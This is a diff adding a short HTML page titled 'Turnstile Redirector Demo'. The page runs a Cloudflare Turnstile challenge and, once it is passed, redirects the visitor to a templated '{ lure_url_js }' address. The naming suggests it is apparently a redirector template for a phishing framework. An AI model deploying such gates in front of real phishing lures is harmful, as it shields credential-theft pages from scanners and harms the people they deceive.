@@ -1,0 +1,21 @@
+<html>
+  <head>
+    <title>Turnstile Redirector Demo</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+  </head>
+  <body>
+    Loading...
+    <div id="cf-turnstile"></div>
+
+    <script>
+      turnstile.ready(function () {
+        turnstile.render("#cf-turnstile", {
+          sitekey: "1x00000000000000000000BB", // replace this with your own sitekey
+          callback: function (token) {
+            window.location.assign({ lure_url_js });
+          },
+        });
+      });
+    </script>
+  </body>
+</html>
